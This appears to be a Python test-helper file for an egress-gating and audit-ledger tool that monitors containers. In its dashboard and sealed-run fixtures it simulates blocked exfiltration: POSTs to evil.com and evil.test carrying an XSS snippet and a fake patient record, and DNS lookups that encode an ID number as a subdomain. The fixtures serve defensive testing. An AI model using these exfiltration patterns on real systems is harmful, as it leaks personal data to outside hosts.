"""Shared builders for tests."""
from pathlib import Path

from poi import canonical as c
from poi.ledger import DeltaOp, Ledger
from poi.lthash import LtHash

T0 = "2026-10-13T18:00:00Z"


def egress(seq, verdict="allow", body_digest="b" * 64):
    return c.egress_element(seq, T0, "POST", "api.example.com", "/v1/score",
                            "h" * 64, body_digest, verdict, "" if verdict == "allow" else "schema")


def make_run(tmp_path: Path, key, n_egress=(2, 1)):
    """Build a small valid run: genesis with 2 files + config, then ticks with egress events."""
    led = Ledger(tmp_path, key)
    accs = {a: LtHash() for a in ("state", "egress", "ingress")}
    counts = {"egress": 0, "ingress": 0}
    f1 = c.file_element("/etc/a", "file", 0o644, 0, 0, "1" * 64)
    f2 = c.file_element("/etc/b", "file", 0o644, 0, 0, "2" * 64)
    cfg = c.config_element("c" * 64)
    ops = [DeltaOp("add", "state", e) for e in (f1, f2, cfg)]
    for op in ops:
        accs["state"].add(op.element)
    container = {"id": "abc", "image": "sha256:" + "0" * 64}
    led.append(t=T0, container=container, policy_digest="p" * 64, accs=accs, counts=counts, ops=ops)
    for i, n in enumerate(n_egress):
        ops = []
        f2new = c.file_element("/etc/b", "file", 0o644, 0, 0, str(i) * 64)
        ops += [DeltaOp("sub", "state", f2), DeltaOp("add", "state", f2new)]
        accs["state"].sub(f2).add(f2new)
        f2 = f2new
        for _ in range(n):
            counts["egress"] += 1
            e = egress(counts["egress"])
            ing = c.ingress_element(counts["egress"], 200, "h" * 64, "r" * 64)
            ops += [DeltaOp("add", "egress", e), DeltaOp("add", "ingress", ing)]
            accs["egress"].add(e)
            accs["ingress"].add(ing)
            counts["ingress"] += 1
        led.append(t=f"2026-10-13T18:00:0{i + 1}Z", container=container, policy_digest="p" * 64,
                   accs=accs, counts=counts, ops=ops)
    return led


POLICY = b"""
version: 1
on_violation: pause
tick_seconds: 2
output_volume: /srv/out
forward_headers:
  authorization: Bearer test-token
endpoints:
  - host: api.example.com
    method: POST
    path: /v1/score
    request_schema:
      type: object
      additionalProperties: false
      required: [model, count]
      properties:
        model: {enum: [small, large]}
        count: {type: integer, minimum: 0, maximum: 255}
fingerprint: {k: 32, w: 16}
"""


class FakeFS:
    """In-memory ContainerFS. Files: {path: bytes | None(dir) | ("link", target)}."""

    def __init__(self, image: dict, mounts=()):
        self.image = dict(image)
        self.files = dict(image)
        self.mounts = list(mounts)
        self.networks = {"poi-int": True}
        self.mtime = {}

    def write(self, path, data):
        self.files[path] = data
        self.mtime[path] = self.mtime.get(path, 0) + 1

    def delete(self, path):
        for k in [k for k in self.files if k == path or k.startswith(path + "/")]:
            del self.files[k]

    def _tar(self, files):
        import io
        import tarfile
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as t:
            for p in sorted(files):
                v = files[p]
                ti = tarfile.TarInfo(p.lstrip("/"))
                ti.mode = 0o644
                if v is None:
                    ti.type, ti.mode = tarfile.DIRTYPE, 0o755
                    t.addfile(ti)
                elif isinstance(v, tuple):
                    ti.type, ti.linkname = tarfile.SYMTYPE, v[1]
                    t.addfile(ti)
                else:
                    ti.size = len(v)
                    t.addfile(ti, io.BytesIO(v))
        data = buf.getvalue()
        return [data[i:i + 1000] for i in range(0, len(data), 1000)]

    def export(self):
        return self._tar(self.files)

    def export_image(self):
        return self._tar(self.image)

    def diff(self):
        out = []
        for p in sorted(self.image.keys() - self.files.keys()):
            out.append({"Path": p, "Kind": 2})
        for p in sorted(self.files):
            if p not in self.image:
                out.append({"Path": p, "Kind": 1})
            elif self.files[p] != self.image[p]:
                out.append({"Path": p, "Kind": 0})
        return out

    def stat(self, path):
        if path not in self.files:
            return None
        v = self.files[path]
        return {"name": path, "size": len(v) if isinstance(v, bytes) else 0, "mtime": self.mtime.get(path, 0)}

    def archive(self, path):
        name = path.rsplit("/", 1)[-1]
        return self._tar({name: self.files[path]})

    host_extra: dict = {}

    def inspect(self):
        return {"Image": "sha256:img", "Config": {"User": ""},
                "HostConfig": {"Privileged": False, "NetworkMode": "poi-int", "Dns": ["10.0.0.2"],
                               **self.host_extra},
                "NetworkSettings": {"Networks": {n: {} for n in self.networks}},
                "Mounts": self.mounts}

    def network_internal(self, name):
        return self.networks[name]


ENGINE_IMAGE = {"/etc": None, "/etc/os": b"alpine", "/srv": None, "/srv/out": None}
ENGINE_MOUNTS = [{"Destination": "/srv/out", "RW": True, "Type": "bind"}]


def clock_from_zero():
    n = [0]

    def f():
        n[0] += 1
        return f"2026-10-13T18:00:{n[0]:02d}Z"
    return f


def make_engine(tmp_path, key, fs, violations=None, sealer=None):
    """Engine + EgressGate over a FakeFS, writing a run into tmp_path/run."""
    from poi.engine import Engine
    from poi.gate import EgressGate
    from poi.policy import parse
    from poi.publish import LocalPublisher
    from poi.state import StateTracker
    from poi.wal import WalReader, WalWriter

    pol = parse(POLICY)
    out = tmp_path / "out"
    out.mkdir(exist_ok=True)
    eng = Engine(Ledger(tmp_path / "run", key), StateTracker(fs, (out, "/srv/out"), sealer=sealer),
                 WalReader(tmp_path / "run" / "proxy-wal"), LocalPublisher(tmp_path / "run"), pol,
                 {"id": "abc", "image": "sha256:img"}, clock=clock_from_zero(),
                 on_violation=(violations.append if violations is not None else lambda v: None),
                 full_scan_every=3)
    gate = EgressGate(pol, WalWriter(tmp_path / "run" / "proxy-wal", tmp_path / "run" / "evidence", sealer))
    return eng, gate


DASH_SECRET = b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma"
DASH_KEY = "sess-key"


def start_dashboard(tmp_path, key):
    """A verified mirror with one sent request, one blocked attempt carrying user data and one DNS lookup,
    served by the dashboard on a free port. Returns (app, base_url, server)."""
    import threading

    from poi.dashboard import DashboardApp, make_dashboard_server
    from poi.fingerprint import FingerprintSet
    from poi.ledger import pubkey_hex
    from poi.mirror import Mirror
    from poi.source import LocalSource

    fs = FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS)
    eng, gate = make_engine(tmp_path, key, fs)
    (tmp_path / "run").mkdir(exist_ok=True)
    (tmp_path / "run" / "policy.yaml").write_bytes(POLICY)
    eng.genesis()
    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    gate.on_response(r.seq, 200, [("content-type", "application/json")], b'{"score":0.5}')
    gate.on_request("evil.com", "POST", "/drop", [], b"<script>alert(1)</script>" + DASH_SECRET)
    gate.wal.record_dns("2026-10-13T18:00:00Z", "x.evil.com", "A", "block")
    fs.write("/tmp", None)
    fs.write("/tmp/x", b"1")
    eng.tick()
    fp = FingerprintSet(b"k" * 32)
    fp.add(DASH_SECRET, "patients.csv")
    m = Mirror(tmp_path / "mirror", LocalSource(tmp_path / "run", runtime=lambda: {"status": "running"}),
               pubkey_hex(key), fp, sleep=lambda s: None)
    m.sync_once(wait=0)
    m.refresh_runtime()
    app = DashboardApp(m, "local:run")
    srv = make_dashboard_server(app, DASH_KEY, port=0)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return app, f"http://127.0.0.1:{srv.server_address[1]}", srv


def http_call(url, method="GET", headers=None):
    import urllib.error
    import urllib.request
    req = urllib.request.Request(url, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read()
FAST_KDF = {"m_kib": 1024, "t": 1, "p": 1}       # Argon2id parameters that keep tests fast


SEALED_EK = b"e" * 32


def make_sealed_run(tmp_path, key, client_pub=None):
    """Sealed run over a FakeFS. Returns (run_dir, sealer, client_sk or None when client_pub was given)."""
    from poi.seal import kem
    from poi.seal.sealer import Sealer, sealed_doc

    client_sk = None
    if client_pub is None:
        client_sk, client_pub = kem.generate()
    s = Sealer(SEALED_EK)
    eng, gate = make_engine(tmp_path, key, FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS), sealer=s)
    run = tmp_path / "run"
    run.mkdir(exist_ok=True)
    (run / "policy.yaml").write_bytes(POLICY)
    (run / "sealed.json").write_bytes(sealed_doc(SEALED_EK, client_pub, "r1", b"run-pub"))
    eng.genesis()
    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    gate.on_response(r.seq, 200, [("content-type", "application/json")], b'{"score":0.5}')
    gate.on_request("evil.test", "POST", "/c/85010112345", [], DASH_SECRET)
    gate.wal.record_dns(T0, "85010112345.evil.test", "A", "block")
    (tmp_path / "out" / "r.txt").write_bytes(b"result")
    eng.tick()
    return run, s, client_sk
